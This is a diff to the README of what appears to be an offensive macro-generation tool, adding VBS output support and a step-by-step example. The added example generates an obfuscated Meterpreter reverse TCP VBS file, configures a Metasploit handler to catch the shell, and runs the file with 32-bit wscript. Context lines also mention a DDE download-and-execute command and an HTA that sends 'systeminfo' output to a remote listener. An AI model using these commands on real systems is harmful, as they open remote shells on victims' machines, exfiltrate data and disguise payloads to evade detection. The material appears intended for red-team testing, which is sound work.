@@ -47,6 +47,7 @@ Supported formats are:
 * MS Visio 97 (.vsd)
 * MS Visio (.vsdm)
 * VBA text file (.vba)
+* VBS text file (.vbs)
 * HTA text file (.hta)
 
 
@@ -149,6 +150,26 @@ python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc
 ```
 
 
+ - Generate obfuscated Meterpreter reverse TCP VBS file and run it  
+ ```batch
+# 1 Generate obfuscated VBS based on meterpreter template
+echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.vbs
+# 2 On attacker machinge Setup meterpreter listener
+Open msfconsole:
+use exploit/multi/handler
+set LHOST 0.0.0.0
+set PAYLOAD windows/meterpreter/reverse_tcp
+set AutoRunScript post/windows/manage/smart_migrate
+set EXITFUNC thread
+set ExitOnSession false
+set EnableUnicodeEncoding true
+set EnableStageEncoding true
+# 3 run VBS file with wscript (run 32bit wscript because meterpreter payload is 32bit)
+%windir%\SysWoW64\wscript meter.vbs
+
+ ```
+
+
 - Generated obfuscated HTA file which executes "systeminfo" and returns result to another macro_pack listening on 192.168.0.5
 ```batch
 # 1 Generate HTA file with CMD template
@@ -218,7 +239,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
          
          
     -G, --generated=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
-        Supported extensions are: vba, hta, doc, docm, xls, xlsm, pptm, vsd, vsdm.
+        Supported extensions are: vba, vbs, hta, doc, docm, xls, xlsm, pptm, vsd, vsdm.
         Note: Apart from vba which is a text files, all other requires Windows OS with right MS Office application installed.
     
     --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
